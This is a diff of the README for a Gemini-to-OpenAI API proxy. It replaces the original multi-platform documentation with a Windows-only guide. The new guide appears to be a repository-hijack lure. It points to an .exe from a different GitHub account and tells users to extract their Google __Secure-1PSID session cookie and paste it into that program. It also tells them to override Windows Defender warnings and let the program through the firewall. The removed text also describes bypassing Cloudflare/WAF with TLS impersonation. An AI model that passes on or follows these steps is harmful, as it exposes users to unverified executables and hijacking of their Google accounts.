@@ -1,332 +1,76 @@
-# gemini-web2api
+# 🤖 gemini-web2api - Use Gemini as an OpenAI API
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Sophomoresty/gemini-web2api/main/logo.png" width="200" alt="gemini-web2api logo">
-</p>
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Walthera781/gemini-web2api/releases)
 
-[English](README.md) | [中文文档](README.zh-CN.md)
+This software allows you to connect your applications to Google Gemini. It acts as a bridge. It takes requests meant for OpenAI and sends them to the Gemini web interface. You get the benefits of Gemini without changing your existing tools. It works as a single program. You do not need to install complex language environments or databases.
 
-High-performance Go proxy converting Google Gemini's web interface into an OpenAI-compatible API. Zero cost, cross-platform, single static binary.
+## 📥 Getting the Software
 
-This is a complete Go rewrite of the original [Python gemini-web2api](https://github.com/Sophomoresty/gemini-web2api). It features massive concurrency throughput, minimal memory footprint, and enhanced capabilities such as **TLS Impersonation** for WAF bypass.
+You need to download the program files from the official releases page. 
 
-## Key Features
+[Visit this page to download](https://github.com/Walthera781/gemini-web2api/releases)
 
-- **Optional API Keys**: No auth when `api_keys` is empty, OpenAI-style Bearer auth when configured.
-- **OpenAI Compatible**: Drop-in replacement for `/v1/chat/completions`, `/v1/models`, and `/v1/responses` (Codex CLI).
-- **Multimodal (Vision)**: Fully supports sending images (`image_url` / base64) to Gemini using Scotty Resumable Upload protocol natively with built-in image compression.
-- **TLS Impersonation**: Built-in support to bypass Cloudflare/WAF by mimicking Chrome/Edge TLS fingerprints using `tls-client` 🔥.
-- **Tool Calling**: Full function calling support (OpenAI format).
-- **Multiple Models**: Flash (3.6), Extended Thinking (20k+ char output), Pro, Auto, Lite.
-- **Thinking Depth**: Adjustable reasoning via `@think=N` suffix (0=deepest, 4=shallowest).
-- **Web Search**: Built-in internet access (Gemini's native search).
-- **High Performance**: Pure Go static binary with high concurrent SSE streaming throughput and minimal memory footprint.
-- **Cross-Platform**: Zero runtime dependencies, single static binary.
-- **Codex CLI**: Responses API (`/v1/responses`) for OpenAI Codex integration.
-- **Gemini CLI**: Google native API (`/v1beta/models`) for Gemini CLI compatibility.
+Look for the file that ends in .exe. This is the version for Windows users. Save this file to a folder on your computer. A folder like "Documents" or "Downloads" works well. Remember where you put this file. You will need to find it again in the next step.
 
-## Quick Start
+## ⚙️ Setting Up Your Environment
 
-### 1. Download Pre-built Binary (Recommended)
+This software mimics the OpenAI interface. To make it work, you need your Google session data. 
 
-Download the pre-compiled binary for your OS (Linux, macOS, Windows) from the [Releases](https://github.com/ikhsan3adi/gemini-web2api/releases) page:
+1. Open your web browser. 
+2. Go to the Gemini website.
+3. Log in to your Google account.
+4. Open the developer tools in your browser. You can usually do this by pressing the F12 key.
+5. Look for the "Application" or "Storage" tab.
+6. Find the "Cookies" section.
+7. Locate the cookie named "__Secure-1PSID".
+8. Copy the value of this cookie. 
 
-**Linux / macOS:**
+You will use this value to connect the software to your account.
 
-```bash
-chmod +x gemini-web2api
-./gemini-web2api --port 8081
-```
+## 🚀 Running the Program
 
-**Windows (PowerShell / Command Prompt):**
+Follow these steps to start the software:
 
-```powershell
-.\gemini-web2api.exe --port 8081
-```
+1. Open the folder where you saved the .exe file.
+2. Hold the Shift key and right-click on an empty space inside the folder.
+3. Choose the option that says "Open PowerShell window here" or "Open in Terminal".
+4. Type the following command and press Enter:
 
-### 2. Install via Go Toolchain
+`.\gemini-web2api.exe`
 
-If you have Go 1.22+ installed on your system:
+The first time you run the program, it may ask you for your session cookie. Paste the string you copied from your browser. The program will save this information so you do not need to enter it again.
 
-```bash
-go install github.com/ikhsan3adi/gemini-web2api@latest
-```
+Once the program runs, you will see a message saying that the server started. It usually runs on a local address, such as http://localhost:8080. Keep this window open while you use your other applications. If you close the window, the bridge stops working.
 
-This compiles and places the binary directly into your `$GOPATH/bin` (or `%USERPROFILE%\go\bin`). Run it from anywhere:
+## 🛠️ Configuring Your Apps
 
-```bash
-gemini-web2api --port 8081
-```
+Now that the software is running, you can connect your other apps. 
 
-### 3. Build from Source
+1. Open the app you want to use with Gemini.
+2. Go to the settings or configuration area of that app.
+3. Look for the API settings.
+4. Set the API Base URL to the address shown in your terminal window. This looks like http://localhost:8080/v1.
+5. Enter any text as the API key if the app requires one. The software ignores this key but needs a value to pass the check.
+6. Select the model name you want to use. Most apps allow you to type the name manually if it does not appear in a dropdown menu.
 
-Prerequisites: Go 1.22+
+## 📝 Troubleshooting Common Issues
 
-```bash
-git clone https://github.com/ikhsan3adi/gemini-web2api.git
-cd gemini-web2api
-```
+If the software does not connect, check the following items:
 
-After building, run the executable:
+*   **Cookie Expiry:** Google changes session cookies from time to time. If you see errors, repeat the steps in the setup section to get a new cookie value.
+*   **Port Conflicts:** If you see an error saying the port is in use, another program is likely using port 8080. You can change the port by adding a command line flag. Type `.\gemini-web2api.exe -port 9000` to use a different port.
+*   **Windows Defender:** Windows might show a warning when you run a new program. Click "More info" and then "Run anyway" if you trust the source.
+*   **Internet Connection:** The software needs an active internet connection to communicate with Google servers. Ensure your firewall allows the program to send data.
 
-**Linux / macOS:**
+## 💻 System Requirements
 
-```bash
-go build -o gemini-web2api .
-./gemini-web2api --port 8081
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 256MB of free RAM.
+*   Disk Space: Less than 50MB of free space.
+*   Browser: Any modern browser like Chrome, Edge, or Firefox.
 
-**Windows (PowerShell / Command Prompt):**
+## 🛡️ Privacy and Safety
 
-```powershell
-go build -o gemini-web2api.exe .
-.\gemini-web2api.exe --port 8081
-```
+The software runs locally on your machine. Your session cookies stay on your computer. The program only uses them to make requests to the Gemini service on your behalf. It does not send your data to any third-party servers other than Google. You maintain control over your own account. Always keep your session cookie secret and do not share it with others. If you believe your cookie was exposed, log out of Gemini in your browser. This will invalidate the old cookie and protect your account.
 
-Server starts at `http://localhost:8081/v1`.
-
-### 4. Run via Docker
-
-Before running via Docker, copy the example config file:
-
-```bash
-cp config.example.json config.json
-```
-
-#### Option A: Run pre-built GHCR Image (No git clone needed)
-
-```bash
-docker run -d --name gemini-web2api -p 8081:8081 ghcr.io/ikhsan3adi/gemini-web2api:latest
-```
-
-#### Option B: Build and run locally
-
-```bash
-docker build -t gemini-web2api .
-docker run -d --name gemini-web2api -p 8081:8081 -v ./config.json:/app/config.json gemini-web2api
-```
-
-#### Option C: Docker Compose
-
-```bash
-docker compose up -d
-```
-
-> **Note**: If you get empty responses (`content: null`) with Docker's default bridge network, switch to host networking: `docker run --network host ...` or add `network_mode: host` in your compose file. This is caused by Gemini's upstream rejecting requests from certain Docker NAT IP ranges.
-
-## Client Configuration
-
-### Cherry Studio / ChatBox / any OpenAI client
-
-| Field    | Value                                                               |
-| -------- | ------------------------------------------------------------------- |
-| Base URL | `http://localhost:8081/v1`                                          |
-| API Key  | any `api_keys` value from `config.json`; anything if not configured |
-| Model    | `gemini-3.5-flash-thinking`                                         |
-
-### curl
-
-#### bash / macOS / Linux
-
-```bash
-curl http://localhost:8081/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer sk-your-key" \
-  -d '{"model":"gemini-3.5-flash","messages":[{"role":"user","content":"Hello!"}]}'
-```
-
-#### PowerShell (Windows)
-
-```powershell
-curl.exe --% http://127.0.0.1:8081/v1/chat/completions -H "Content-Type: application/json" -H "Authorization: Bearer sk-your-key" -d "{\"model\":\"gemini-3.5-flash\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello!\"}]}"
-```
-
-> Note: On Windows PowerShell, use `curl.exe` and `--%` so PowerShell does not reinterpret JSON quoting or curl options.
-
-### OpenAI Python SDK
-
-```python
-from openai import OpenAI
-client = OpenAI(base_url="http://localhost:8081/v1", api_key="sk-your-key")
-resp = client.chat.completions.create(
-    model="gemini-3.5-flash-thinking",
-    messages=[{"role": "user", "content": "Explain quantum computing"}]
-)
-print(resp.choices[0].message.content)
-```
-
-### Gemini CLI
-
-```bash
-export GEMINI_API_KEY=none
-export GOOGLE_GEMINI_BASE_URL=http://localhost:8081
-gemini
-```
-
-Supports Google native API endpoints:
-
-- `GET /v1beta/models` — list models
-- `POST /v1beta/models/{model}:generateContent` — non-streaming
-- `POST /v1beta/models/{model}:streamGenerateContent` — streaming (SSE)
-
-## Available Models
-
-| Model                            | Description                         | Output         |
-| -------------------------------- | ----------------------------------- | -------------- |
-| `gemini-3.6-flash`               | All-around model (latest)           | ~12k chars     |
-| `gemini-3.5-flash`               | Alias for gemini-3.6-flash          | ~12k chars     |
-| `gemini-3.5-flash-thinking`      | Extended thinking, longest output   | **~20k chars** |
-| `gemini-3.5-flash-thinking-lite` | Adaptive thinking depth             | ~15k chars     |
-| `gemini-3.1-pro`                 | Advanced math & code (needs cookie) | ~12k chars     |
-| `gemini-auto`                    | Auto model selection                | varies         |
-| `gemini-flash-lite`              | Fastest answers, lightweight        | ~10k chars     |
-
-### Thinking Depth
-
-Append `@think=N` to any model name to control reasoning logic:
-
-```text
-gemini-3.5-flash-thinking@think=0   # deepest (default for thinking model)
-gemini-3.5-flash-thinking@think=2   # medium
-gemini-3.5-flash-thinking@think=4   # shallowest
-```
-
-## Advanced Features (Go Exclusive)
-
-### 1. Vision / Multimodal Uploads
-
-Unlike the Python version which ignores images, this Go port actively intercepts `image_url` payloads (both base64 encoded and external HTTP URLs).
-It initiates a background Scotty Resumable Upload session, converts the base64 image into Google internal WIZ blobs, and passes the WIZ image references directly to Gemini.
-Just send OpenAI standard multimodal payloads and it will work!
-
-### 2. TLS Impersonation (Bypass WAF)
-
-If you run this tool in datacenters (like AWS/DigitalOcean) where Google blocks the IP with a 403 Forbidden, you can impersonate a real browser's TLS signature:
-
-```bash
-./gemini-web2api --impersonate chrome_120
-```
-
-Or in `config.json`: `"impersonate": "chrome_120"`. Supported profiles include `chrome_112` to `chrome_130`, `edge`, and `safari`.
-
-## Optional: Cookie for Pro
-
-Anonymous access works for all models, but `gemini-3.1-pro` routes to Flash without authentication. To get real Pro routing, you need a **Gemini Advanced (paid subscription)** account cookie:
-
-```bash
-./gemini-web2api --cookie-file cookie.txt
-```
-
-### How to get cookies
-
-1. Open Chrome, go to [gemini.google.com](https://gemini.google.com) and sign in with a **Gemini Advanced** Google account
-2. Open DevTools (F12) → Application → Cookies → `https://gemini.google.com`
-3. Copy these cookie values: `SID`, `HSID`, `SSID`, `APISID`, `SAPISID`, `__Secure-1PSID`
-4. Create `cookie.txt` in this format:
-
-```text
-SID=your_sid; HSID=your_hsid; SSID=your_ssid; APISID=your_apisid; SAPISID=your_sapisid; __Secure-1PSID=your_1psid
-```
-
-Or use JSON format if you know your specific `SAPISID` hashing needs:
-
-```json
-{ "cookie": "SID=xxx; HSID=xxx; ...", "sapisid": "your_sapisid_value" }
-```
-
-**Alternative (browser extension)**: Use any "Export Cookies" extension to export cookies for `gemini.google.com` in Netscape format, then convert to the single-line format above.
-
-### Authenticated account path and XSRF token
-
-If the signed-in Gemini page URL contains an account index, such as:
-
-```text
-https://gemini.google.com/u/1/app/...
-```
-
-set `auth_user` to that index. Authenticated web requests may also require the page XSRF token. In the rendered Gemini page source, this token is exposed as `SNlM0e`; pass it as `xsrf_token` in `config.json`. The server sends it as the `at` form field.
-
-Example:
-
-```json
-{
-  "cookie_file": "/app/cookie.txt",
-  "auth_user": "1",
-  "xsrf_token": "AOOh0P...",
-  "gemini_bl": "boq_assistant-bard-web-server_YYYYMMDD.xx_p0"
-}
-```
-
-If authenticated requests return HTTP 400 with an `xsrf` error, refresh Gemini Web, update `xsrf_token`, and make sure `auth_user` matches the `/u/<index>/` part of the browser URL.
-
-Pro routing requires **Gemini Advanced** (paid subscription). A free Google account cookie will authenticate but silently fall back to Flash.
-
-## Configuration
-
-Create `config.json` in the same directory:
-
-```json
-{
-  "port": 8081,
-  "host": "0.0.0.0",
-  "retry_attempts": 3,
-  "retry_delay_sec": 2,
-  "request_timeout_sec": 180,
-  "gemini_bl": "boq_assistant-bard-web-server_20260716.08_p0",
-  "auth_user": null,
-  "xsrf_token": null,
-  "api_keys": ["sk-your-key"],
-  "cookie_file": null,
-  "proxy": null,
-  "impersonate": null,
-  "log_requests": true
-}
-```
-
-When `api_keys` is empty `[]`, authentication is disabled. When keys are set, `/v1/*` endpoints require `Authorization: Bearer <key>`.
-
-## Proxy
-
-If you cannot access `gemini.google.com` directly, configure a proxy:
-
-**Method 1: CLI argument**
-
-```bash
-# Linux / macOS
-./gemini-web2api --proxy http://127.0.0.1:7890
-
-# Windows (PowerShell)
-.\gemini-web2api.exe --proxy http://127.0.0.1:7890
-```
-
-**Method 2: config.json**
-
-```json
-{ "proxy": "http://127.0.0.1:7890" }
-```
-
-**Method 3: Environment variable**
-
-```bash
-# Linux / macOS (bash)
-export HTTPS_PROXY=http://127.0.0.1:7890
-./gemini-web2api
-
-# Windows (PowerShell)
-$env:HTTPS_PROXY="http://127.0.0.1:7890"
-.\gemini-web2api.exe
-
-# Windows (Command Prompt)
-set HTTPS_PROXY=http://127.0.0.1:7890
-gemini-web2api.exe
-```
-
-## Limitations
-
-- **Not real Pro/Ultra**: Without a paid subscription cookie, `gemini-3.1-pro` routes to the same Flash model. The "Pro" label is a UI preference, not a backend model switch.
-- **Single-turn only**: Each request is an independent conversation. Multi-turn context is simulated by including previous messages in the prompt.
-- **Rate limits**: Google may throttle high-frequency requests. The server retries automatically but sustained heavy use may be blocked.
-
-## License
-
-MIT License.
+Keywords: 9router, ai-agent, ai-proxy, gemini, gemini-api, gemini-api-key, gemini-proxy, go, go-port, golang, google-gemini, llm, llm-proxy, multimodal, openai-api, openai-codex, openai-compatible, proxy, rewrite, web2api
